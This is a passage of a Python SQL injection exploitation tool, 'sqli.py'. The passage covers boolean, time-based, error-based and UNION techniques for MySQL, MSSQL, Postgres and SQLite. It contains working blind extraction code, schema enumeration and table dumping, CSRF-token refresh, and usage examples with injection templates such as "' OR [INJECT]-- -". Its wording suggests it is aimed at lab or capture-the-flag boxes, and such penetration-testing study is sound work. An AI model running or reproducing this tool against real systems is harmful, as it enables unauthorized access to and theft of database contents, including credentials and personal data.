        noop = "0" if self.prof["name"] != "mssql" else "'0'"
        for _ in range(8):
            payload = self.tmpl_str.replace(INJECT, noop)
            start = time.time()
            try:
                self.sender.send(payload)
            except Exception:
                continue
            samples.append(time.time() - start)
        if len(samples) < 3:
            print("[!] time: baseline sampling failed (unreachable?).")
            return False
        samples.sort()
        med = samples[len(samples)//2]
        p95 = samples[min(len(samples)-1, int(len(samples)*0.95))]
        jitter = max(p95 - med, 0.05)
        self.base = p95
        if self.auto:
            self.delay = max(1.0, round(4 * jitter, 2))
        self.threshold = self.base + self.delay * 0.5
        print(f"[+] time baseline p95 {p95:.3f}s jitter {jitter:.3f}s "
              f"-> DELAY {self.delay:.2f}s threshold {self.threshold:.3f}s")
        # pick a sleep wrapper that actually delays on TRUE only
        for w in self.prof["sleep_wrappers"]:
            self.wrapper = w
            t_true = self._send_timed(w.format(cond="1=1", d=self.delay))
            t_false = self._send_timed(w.format(cond="1=2", d=self.delay))
            if t_true is None or t_false is None:
                continue
            if t_true >= self.threshold and t_false < self.threshold:
                print(f"[+] time wrapper: {w}")
                return True
        self.wrapper = None
        print("[!] time: no wrapper fired (not injectable here, or wrong dbms?).")
        return False

    def truth(self, condition):
        expr = self.wrapper.format(cond=condition, d=self.delay)
        # re-measure ambiguous readings up to 3x
        votes = []
        for _ in range(3):
            t = self._send_timed(expr)
            if t is None:
                continue
            decisive = abs(t - self.threshold) > self.delay * 0.25
            vote = t >= self.threshold
            if decisive:
                return vote
            votes.append(vote)
        return sum(votes) * 2 > len(votes) if votes else False


# ===========================================================================
# CHAR-BY-CHAR EXTRACTOR  (shared by boolean + time)
# ===========================================================================

class BlindExtractor:
    """Binary-search char extraction on top of any truth(condition) oracle."""
    FAST_SINGLES = [44]                              # ,
    FAST_RANGES  = [(97, 122), (48, 57), (65, 90)]   # a-z 0-9 A-Z

    def __init__(self, oracle, prof, threads=1, verify=True, guard_votes=5):
        self.oracle = oracle
        self.prof = prof
        self.threads = max(1, threads)
        # same confirm/reread the reflect oracles expose, but over the blind
        # truth() channel: confirm = ask a boolean, reread = re-extract one char.
        # guard_votes is lowered for time-based, whose truth() already votes
        # internally, so verification does not add dozens of extra sleeps.
        self.guard = (BleedGuard(oracle.truth, prof, self._reread_char,
                                 votes=guard_votes) if verify else None)

    def _reread_char(self, subquery, pos):
        return chr(self._char(subquery, pos))

    def _ascii_expr(self, subquery, pos):
        return self.prof["ascii"](self.prof["substr"](subquery, pos, 1))

    def _bsearch(self, expr, lo, hi):
        while lo < hi:
            mid = (lo + hi) // 2
            if self.oracle.truth(f"{expr}>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        return lo

    def _char(self, subquery, pos):
        expr = self._ascii_expr(subquery, pos)
        for v in self.FAST_SINGLES:
            if self.oracle.truth(f"{expr}={v}"):
                return v
        for lo, hi in self.FAST_RANGES:
            if not self.oracle.truth(f"{expr} NOT BETWEEN {lo} AND {hi}"):
                return self._bsearch(expr, lo, hi)
        return self._bsearch(expr, 0, 255)

    def _length(self, subquery):
        expr = self.prof["length"](subquery)
        lo, hi = 0, 4096
        while lo < hi:
            mid = (lo + hi) // 2
            if self.oracle.truth(f"{expr}>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        return lo

    def _live(self, label, s):
        """Rolling per-character display, capped to the terminal width so a long
        value shows its most recent tail instead of wrapping and spamming."""
        if not label:
            return
        width = shutil.get_terminal_size((100, 24)).columns
        avail = max(20, width - len(label) - 6)
        disp = s if len(s) <= avail else "..." + s[-(avail - 3):]
        sys.stdout.write(f"\r{label}{disp}\033[K")   # \033[K clears to line end
        sys.stdout.flush()

    def _extract_pass(self, subquery, n, label):
        """One full character-by-character pass with the live display."""
        buf = [0] * n
        ctl = getattr(self.oracle, "ctl", None)
        if self.threads == 1:
            run_val, run_len, warned = None, 0, False
            for i in range(n):
                c = self._char(subquery, i + 1)
                buf[i] = c
                # stuck-run heuristic: a long run of one identical character is
                # the classic 'oracle is stuck' signature -> slow down.
                if c == run_val:
                    run_len += 1
                else:
                    run_val, run_len = c, 1
                if run_len == 8:
                    if not warned:
                        sys.stdout.write("\n[~] long run of one character - "
                                         "likely a stuck oracle, slowing down\n")
                        sys.stdout.flush()
                        warned = True
                    if ctl:
                        ctl.on_ambiguous()
                self._live(label, bytes(buf[:i + 1]).decode("utf-8", "replace"))
        else:
            lock = threading.Lock()
            done = [0]
            def work(i):
                v = self._char(subquery, i + 1)
                buf[i] = v
                if label:
                    with lock:
                        done[0] += 1
                        sys.stdout.write(f"\r{label}{done[0]}/{n} chars\033[K")
                        sys.stdout.flush()
            with ThreadPoolExecutor(max_workers=self.threads) as ex:
                for f in as_completed([ex.submit(work, i) for i in range(n)]):
                    f.result()
        return bytes(buf).decode("utf-8", "replace")

    def leak(self, subquery, label=None):
        n = self._length(subquery)
        if n == 0:
            if label:
                sys.stdout.write(f"{label}\n")
            return ""
        raise_m = getattr(self.oracle, "raise_margin", lambda: None)
        relax_m = getattr(self.oracle, "relax_margin", lambda: None)
        ctl = getattr(self.oracle, "ctl", None)
        status = None
        for attempt in range(1, 4):          # fast first pass, re-do if bleeding
            s = self._extract_pass(subquery, n, label)
            if not (self.guard and self.guard.enabled and s):
                break
            s, status = self.guard.check(subquery, s)
            if status in ("clean", None):
                relax_m()                    # healthy -> ease back toward fast
                break
            # the verifier caught bleeding: sturdier reads from here on
            raise_m()
            if ctl:
                ctl.on_ambiguous()
            if status == "repaired":
                break                        # guard already fixed this value
            n = self._length(subquery)       # unverified/truncated -> full redo
        if label:
            tag = "" if status in (None, "clean") else f"  [{status}]"
            # clear the rolling line, then print the FULL final value once
            sys.stdout.write(f"\r\033[K{label}{s}{tag}\n")
            sys.stdout.flush()
        return s


# ===========================================================================
# ENUMERATION WALK  (identical regardless of oracle/technique/dbms)
# ===========================================================================

class Dumper:
    """Uses a `.leak(subquery, label)` provider (BlindExtractor for
    boolean/time, ErrorOracle/UnionOracle for reflect) to walk the schema."""
    def __init__(self, leaker, prof):
        self.leak = leaker.leak
        self.prof = prof

    def databases(self):
        s = self.leak(self.prof["dbs"], label="[*] databases: ")
        return [x for x in s.split(AGG) if x] if s else []

    def tables(self, db):
        s = self.leak(self.prof["tables"](db), label=f"[*] tables in {db}: ")
        return [x for x in s.split(AGG) if x] if s else []

    def columns(self, db, t):
        s = self.leak(self.prof["columns"](db, t), label=f"[*] columns in {db}.{t}: ")
        return [x for x in s.split(AGG) if x] if s else []

    def dump(self, db, t):
        cols = self.columns(db, t)
        if not cols:
            print(f"    (no columns for {db}.{t})")
            return
        data = []
        for c in cols:
            s = self.leak(self.prof["single_col"](c, db, t), label=f"    {c}: ")
            data.append([x for x in s.split(AGG)] if s else [])
        n = max((len(cd) for cd in data), default=0)
        rows = [[cd[i] if i < len(cd) else "" for cd in data] for i in range(n)]
        render_table(cols, rows)


def render_table(headers, rows):
    widths = [len(h) for h in headers]
    for row in rows:
        for i in range(len(headers)):
            widths[i] = max(widths[i], len(row[i]) if i < len(row) else 0)
    bar = "+" + "+".join("-" * (w + 2) for w in widths) + "+"
    def fmt(cols):
        return "| " + " | ".join(
            (cols[i] if i < len(cols) else "").ljust(widths[i])
            for i in range(len(headers))) + " |"
    print("    " + bar)
    print("    " + fmt(headers))
    print("    " + bar)
    for row in rows:
        print("    " + fmt(row))
    print("    " + bar)


def choose(items, label):
    print(f"\nAvailable {label}s:")
    print("   0) ALL")
    for i, it in enumerate(items, 1):
        print(f"   {i}) {it}")
    while True:
        p = input(f"Select {label} (number, 0=all, or a list like 9,15): ").strip()
        if p == "0":
            return items
        # accept a comma/space separated list of numbers (e.g. "9,15" or "9 15")
        parts = [x for x in re.split(r"[,\s]+", p) if x]
        if parts and all(x.isdigit() and 1 <= int(x) <= len(items) for x in parts):
            # de-dupe while preserving the order the user typed
            picked, seen = [], set()
            for x in parts:
                idx = int(x) - 1
                if idx not in seen:
                    seen.add(idx)
                    picked.append(items[idx])
            return picked
        print("   invalid choice.")


# ===========================================================================
# UNION COLUMN CALIBRATION
# ===========================================================================

def union_calibrate(sender, tmpl_str, max_cols=20):
    """Find column count + a visible position by planting hex markers."""
    def marker(i):
        return f"qzq{i}qzq"
    for k in range(1, max_cols + 1):
        cols = [f"0x{marker(i).encode().hex()}" for i in range(k)]
        payload = tmpl_str.replace(INJECT, ",".join(cols))
        text = sender.send(payload).text
        visible = [i for i in range(k) if marker(i) in text]
        if visible:
            return k, visible[0]
    return None, None


# ===========================================================================
# ARG PARSING
# ===========================================================================

def build_parser():
    p = argparse.ArgumentParser(
        prog="sqli.py",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description="Manual SQLi extraction helper. You find the "
                    "injection; this dumps it.",
        epilog="""
examples:
  # RECOMMENDED for flaky redirect/flash boxes: 3-state oracle. A reply showing
  # NEITHER phrase (error/500/419 under load) is retried, not miscounted, and
  # the request rate auto-throttles until the box keeps up. No more 'aaaa'.
  sqli.py -r req.txt --technique boolean --dbms mysql --follow \\
          --template "nonexistent@x.com' OR [INJECT]-- -" \\
          --true-text "e-mailed your password reset link" \\
          --false-text "does not match in our records"

  # boolean, redirect oracle (TRUE=302 to a success path), request from Burp
  sqli.py -r req.txt --technique boolean --dbms mysql --true-code 302 --no-follow \\
          --template "xxx' OR [INJECT]-- -"

  # boolean, single body-text oracle (stable box)
  sqli.py -u "http://t/login" -X POST -d "user=INJECT*&pass=x" \\
          --technique boolean --dbms mysql --match-not-text "does not match" \\
          --template "xxx' OR [INJECT]-- -"

  # error-based (data reflected in ~...~)
  sqli.py -r req.txt --technique error --dbms mysql \\
          --template "xxx' AND [INJECT]-- -"

  # union (auto-calibrates columns)
  sqli.py -u "http://t/?id=INJECT*" --technique union --dbms mysql \\
          --template "-1 UNION SELECT [INJECT]-- -"

  # time-based (oracle is the response DELAY, no --match-* needed)
  sqli.py -r req.txt --technique time --dbms mysql \\
          --template "xxx' OR [INJECT]-- -"

  # dump specific tables at the picker: type  9,15  to dump both
""")

    src = p.add_argument_group("request source")
    src.add_argument("-r", "--request", help="raw Burp/proxy request file (marker INJECT* inside)")
    src.add_argument("-u", "--url", help="target URL (put INJECT* in the query for GET)")
    src.add_argument("-X", "--method", default=None, help="HTTP method (GET/POST/...)")
    src.add_argument("-d", "--data", help="request body (put INJECT* where it injects)")
    src.add_argument("-H", "--header", action="append", default=[],
                     help="add header 'Name: value' (repeatable; value may hold INJECT*)")
    src.add_argument("--scheme", default="http", choices=["http", "https"],
                     help="scheme when -r has a relative path (default http)")

    core = p.add_argument_group("core")
    core.add_argument("--technique", required=True,
                      choices=["boolean", "error", "time", "union"])
    core.add_argument("--dbms", required=True,
                      choices=["mysql", "mssql", "postgres", "sqlite"])
    core.add_argument("--template", help="payload template with [INJECT] placeholder "
                      "(required unless -r/-d/-u already contains INJECT* AND a plain "
                      "break-out). For blind you almost always want this.")

    # ---- oracle: only for the blind techniques (boolean / time) ----------
    oracle = p.add_argument_group(
        "boolean / time oracle  [REQUIRED for --technique boolean or time]",
        "how a TRUE reply is told apart from a FALSE one. For a flaky redirect/"
        "flash box use the 3-state pair --true-text + --false-text.")
    oracle.add_argument("--true-text", metavar="STR",
                        help="[best for flaky boxes] phrase shown ONLY on TRUE")
    oracle.add_argument("--false-text", metavar="STR",
                        help="[best for flaky boxes] phrase shown ONLY on FALSE. "
                        "Pairing both -> 3-state oracle: a reply with neither "
                        "(error/500/419) is retried, never miscounted.")
    oracle.add_argument("--match-text", metavar="STR",
                        help="[single-signal] text present in body means TRUE")
    oracle.add_argument("--match-not-text", metavar="STR",
                        help="[single-signal] text ABSENT from body means TRUE")
    oracle.add_argument("--true-code", type=int, metavar="N",
                        help="HTTP status == N means TRUE")
    oracle.add_argument("--false-code", type=int, metavar="N",
                        help="HTTP status != N means TRUE")
    oracle.add_argument("--match-location", metavar="STR",
                        help="substring in the Location header means TRUE")
    oracle.add_argument("--match-regex", metavar="RE",
                        help="regex matches the body means TRUE")
    oracle.add_argument("--match-len", metavar="OP N",
                        help="content-length test, e.g. '>1000' means TRUE")
    oracle.add_argument("--follow", dest="follow", action="store_true", default=False,
                        help="follow redirects and read the FINAL page "
                        "(needed when the TRUE/FALSE text is on the redirect target)")
    oracle.add_argument("--no-follow", dest="follow", action="store_false",
                        help="inspect the 3xx itself, do not follow it [default]")

    # ---- boolean reliability tuning --------------------------------------
    tune = p.add_argument_group(
        "boolean tuning  [--technique boolean]",
        "reliability vs speed on unstable targets; defaults are good, touch only "
        "if a box is exceptionally flaky or exceptionally stable.")
    tune.add_argument("--oracle-votes", type=int, default=25, metavar="N",
                      help="max samples per bit; a bit is fixed once one answer "
                           "leads by --oracle-margin (default 25; set 1 to turn "
                           "voting off on a rock-stable target for max speed)")
    tune.add_argument("--oracle-margin", type=int, default=2, metavar="M",
                      help="starting lead (among decisive reads) to fix a bit "
                           "(default 2 = fast; auto-raised when the verifier "
                           "catches bleeding, relaxed again on a clean streak)")
    tune.add_argument("--throttle", type=float, default=0.0, metavar="SEC",
                      help="fixed delay between requests (default 0; the tool "
                           "auto-raises this only while a box bleeds, then lowers "
                           "it again as soon as the box keeps up)")
    tune.add_argument("--max-throttle", type=float, default=3.0, metavar="SEC",
                      help="ceiling for the adaptive throttle (default 3.0)")

    # ---- time-based only -------------------------------------------------
    timeg = p.add_argument_group("time-based options  [--technique time]")
    timeg.add_argument("--delay", type=float, default=None, metavar="SEC",
                       help="fixed SLEEP seconds (omit = auto-calibrate to the box)")

    # ---- verification (all techniques) -----------------------------------
    verifyg = p.add_argument_group(
        "anti-bleed verification  [all techniques]")
    verifyg.add_argument("--no-verify", dest="verify", action="store_false",
                         default=True,
                         help="disable the byte-exact confirm+repair of each "
                              "value (faster, but no anti-corruption guarantee)")

    # ---- connection / auth / misc ----------------------------------------
    conn = p.add_argument_group("connection & misc  [all techniques]")
    conn.add_argument("--threads", type=int, default=1,
                      help="parallel workers for blind extraction (default 1; "
                           "keep at 1 on flaky boxes - concurrency worsens them)")
    conn.add_argument("--timeout", type=float, default=30, help="request timeout s")
    conn.add_argument("--proxy", help="proxy, e.g. http://127.0.0.1:8080 (Burp)")
    conn.add_argument("--csrf-url", help="GET this URL to scrape a fresh anti-CSRF "
                      "token before each request")
    conn.add_argument("--csrf-field", help="form field name of that token (e.g. _token)")
    conn.add_argument("-v", "--verbose", action="store_true",
                      help="print each request/response line to stderr")
    return p


def main():
    parser = build_parser()
    if len(sys.argv) == 1:
        print(BANNER)
        parser.print_help()
        sys.exit(0)
    args = parser.parse_args()
    print(BANNER)

    prof = PROFILES[args.dbms]()

    # ---- build the request template --------------------------------------
    headers = CaseInsensitiveDict()
    method, url, body = args.method, args.url, args.data

    if args.request:
        method, url, headers, body = parse_raw_request(args.request, args.scheme)
    # CLI headers override / add
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()
    if method is None:
        method = "POST" if body else "GET"
    if not url:
        parser.error("need -u URL or -r request file")

    where = locate_marker(method, url, headers, body)
    if where is None:
        parser.error(f"no {MARKER} marker found in url/body/headers. "
                     f"Mark the injection point with {MARKER}.")

    # If a template is given, the marker location currently holds a seed value;
    # we replace that whole seed with the template, and [INJECT] inside the
    # template is filled per request. If no template, the marker is replaced
    # directly with each SQL expression (rare; blind needs a template).
    tmpl = RequestTemplate(method, url, headers, body, where)

    if args.template:
        payload_tmpl = args.template
    else:
        payload_tmpl = INJECT   # marker replaced straight with the expression

    sender = Sender(tmpl, args)

    # ---- seed the session cookie jar from any Cookie header --------------
    # Make the jar the single source of truth so a server Set-Cookie during
    # the run updates cleanly instead of fighting a hardcoded Cookie header.
    cookie_hdr = headers.get("Cookie")
    if cookie_hdr:
        for pair in cookie_hdr.split(";"):
            if "=" in pair:
                cn, cv = pair.strip().split("=", 1)
                sender.session.cookies.set(cn, cv)
        # only drop the static header if it carries no injection marker
        if MARKER not in cookie_hdr:
            headers.pop("Cookie", None)

    # ---- optional CSRF auto-refresh --------------------------------------
    refresher = CsrfRefresher(sender, args)
    if refresher.enabled:
        sender.attach_csrf(refresher, args.csrf_field)
        print(f"[*] CSRF refresh on: scraping '{args.csrf_field}' from {args.csrf_url}")

    # ---- validate match engine where required ----------------------------
    needs_match = args.technique in ("boolean", "time")
    two_signal = bool(args.true_text and args.false_text)
    if (args.true_text and not args.false_text) or (args.false_text and not args.true_text):
        parser.error("--true-text and --false-text must be given together "
                     "(they form the 3-state oracle).")
    has_match = two_signal or any([
        args.true_code is not None, args.false_code is not None,
        args.match_text, args.match_not_text, args.match_regex,
        args.match_location, args.match_len])
    if needs_match and not has_match:
        parser.error("boolean/time need a match condition. For a flaky "
                     "redirect/flash box use the 3-state oracle: "
                     "--true-text \"...\" --false-text \"...\".")

    matcher = Matcher(args) if needs_match else None

    # adaptive throttle controller shared by the boolean oracle
    ctl = ThrottleController(sender, cap=max(0.0, args.max_throttle),
                             verbose=args.verbose)

    # ---- wire the marker-splice to carry the payload template ------------
    # The sender splices `payload` into the MARKER slot. For techniques whose
    # oracle builds a full payload string (they already call
    # tmpl_str.replace([INJECT], ...)), we pass that string as `payload`.
    # So oracle tmpl_str == payload_tmpl, and sender puts it at the marker.

    if args.technique == "boolean":
        oracle = BooleanOracle(sender, matcher, payload_tmpl,
                               margin=max(1, args.oracle_margin),
                               max_votes=max(1, args.oracle_votes), ctl=ctl)
        # truth() already votes per bit, so the guard needs only its double-
        # confirm gate (votes=1) rather than multiplying the request count.
        extractor = BlindExtractor(oracle, prof, threads=args.threads,
                                   verify=args.verify, guard_votes=1)
        _sanity_boolean(oracle)
        dumper = Dumper(extractor, prof)

    elif args.technique == "time":
        if not prof["supports_time"]:
            print(f"[!] {args.dbms} has no usable time-delay primitive; "
                  f"use --technique boolean instead.")
            sys.exit(1)
        oracle = TimeOracle(sender, payload_tmpl, prof, args)
        if not oracle.calibrate():
            if prof["name"] == "mssql":
                print("    MSSQL time-based needs a stacked-query context. If your")
                print("    injection is inside a plain WHERE '...' SELECT, stacking")
                print("    is likely blocked -> use --technique boolean instead.")
            sys.exit(1)
        extractor = BlindExtractor(oracle, prof, threads=args.threads,
                                   verify=args.verify, guard_votes=1)
        dumper = Dumper(extractor, prof)

    elif args.technique == "error":
        oracle = ErrorOracle(sender, payload_tmpl, prof, verify=args.verify)
        _sanity_reflect(oracle, prof)
        dumper = Dumper(oracle, prof)

    elif args.technique == "union":
        print("[*] calibrating union columns...")
        ncols, pos = union_calibrate(sender, payload_tmpl)
        if ncols is None:
            print("[!] no UNION reflection found. Check column count / break-out, "
                  "or output isn't reflected (use boolean/error/time).")
            sys.exit(1)
        print(f"[+] columns={ncols} visible position={pos}")
        oracle = UnionOracle(sender, payload_tmpl, prof, ncols, pos,
                             verify=args.verify)
        dumper = Dumper(oracle, prof)

    walk(dumper, prof)


def _sanity_boolean(oracle):
    # ---- connectivity probe: broken session vs merely flaky box ----------
    # Fire a few un-retried reads. If a TRUE condition NEVER shows the TRUE
    # signal, the oracle simply doesn't work - that is a broken session/token
    # or wrong markers, NOT a flaky box (which shows the signal intermittently).
    # Catch it here in ~1s instead of slowly ramping the throttle to the cap.
    print("[*] probing oracle (broken-session check) ...")
    seen_true = amb = 0
    tries = 8
    for _ in range(tries):
        try:
            v = oracle.raw_verdict("1=1")
        except Exception:
            v = None
        if v is True:
            seen_true += 1
        elif v is None:
            amb += 1
    if seen_true == 0:
        print("[!] the oracle never returned TRUE for 1=1 - it is not working "
              "at all (this is NOT the same as a flaky box).")
        if amb:
            print(f"    {amb}/{tries} responses were ambiguous (neither your "
                  "TRUE nor FALSE marker present).")
        print("    Most likely: a STALE SESSION/CSRF TOKEN - re-capture the")
        print("    request (the box was probably reset; your request file is from")
        print("    an old session). Also verify --true-text/--false-text are EXACT")
        print("    page phrases and that the template still breaks out of the query.")
        sys.exit(1)

    print("[*] sanity: 1=1 should be TRUE, 1=2 FALSE ...")
    t_true = oracle.truth("1=1")
    t_false = oracle.truth("1=2")
    if not (t_true and not t_false):
        print("[!] oracle FAILED (1=1 -> {}, 1=2 -> {}).".format(t_true, t_false))
        print("    Check: --template break-out, the match condition, --follow,")
        print("    and cookies. A bodyless 302 with --match-len will look")
        print("    identical every time -> use --true-code / --match-location.")
        sys.exit(1)
    print("[+] oracle OK.\n")


def _sanity_reflect(oracle, prof):
    print("[*] sanity: leaking version ...")
    v = oracle.leak(prof["version"])
    if not v:
        print("[!] nothing leaked. Error text may not be reflected -> use blind.")
        sys.exit(1)
    print(f"[+] version = {v}\n")


def walk(dumper, prof):
    print("[*] enumerating databases...")
    dbs = dumper.databases()
    if not dbs:
        print("[!] no databases returned.")
        return
    print(f"[+] {', '.join(dbs)}")
    cand = [d for d in dbs if d not in prof["skip_dbs"]] or dbs
    chosen = choose(cand, "database")
    for db in chosen:
        print(f"\n[DB] {db}")
        tables = dumper.tables(db)
        if not tables:
            print("    (no tables)")
            continue
        if len(chosen) == 1:
            tables = choose(tables, "table")
        for t in tables:
            print(f"  [TABLE] {db}.{t}")
            dumper.dump(db, t)
    print("\n[*] done.")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] interrupted.")
    except FileNotFoundError as e:
        print(f"[!] file not found: {e}")
    except OracleStuck as e:
        print(f"\n[!] oracle stuck: {e}")
        print("    The target keeps returning pages that are neither your TRUE")
        print("    nor your FALSE marker (error/500/419/redirect). This is why a")
        print("    single-signal oracle would print a run of identical garbage.")
        print("    Fix one of:")
        print("      * use the 3-state oracle: --true-text \"...\" --false-text \"...\"")
        print("        with EXACT phrases from a known-true and known-false reply")
        print("      * raise --max-throttle (let it slow down more), or set a")
        print("        fixed --throttle 0.5 to stop overloading the box")
        print("      * confirm the injection still works by hand (session/token).")
        sys.exit(2)
    except Exception as e:
        print(f"[!] error: {e}")
